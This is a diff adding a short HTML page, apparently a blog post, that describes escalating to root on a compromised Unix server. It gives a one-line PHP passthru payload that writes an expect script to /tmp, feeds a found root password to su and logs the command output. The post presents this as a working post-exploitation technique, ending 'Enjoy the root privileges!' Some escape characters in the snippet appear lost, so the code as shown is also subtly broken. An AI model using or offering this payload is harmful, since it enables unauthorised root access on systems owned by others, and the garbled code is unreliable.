@@ -1,0 +1,15 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Random</title>
+</head><body>On this occasion, i was lucky and i spotted a file which had a clear text root password in it. However, getting root wasnt very easy, as i could not figure out an easy way to provide this root password within the php script. In the end after searching for quite a bit, i found a way to do this in expect with the following 1 line of php script:<br/>
+<br/>
+&lt;?php passthru('echo -e '#!/usr/bin/expect -fnset password [lrange $argv 0 0]; set cmd [lrange $argv 1 1];set timeout -1; spawn su -c "$cmd" ;match_max 100000 ;expect "*?assword:*"; send -- "$passwordr"; send -- "r"; expect eof'&gt;/tmp/su.exp&amp;/usr/bin/expect /tmp/su.exp passw0rd whoami&gt;&gt;/tmp/out.txt');?&gt;<br/>
+<br/>
+This script will do the following:<br/>
+1. create an expect script(/tmp/su.exp) which will take the root (su) password and command to execute as argument.<br/>
+2. run the expect script with the root password and command to run as root.<br/>
+<br/>
+Enjoy the root privileges!<br/>
+P.S: it is quite common to see expect installed on *nix application servers</body></html>
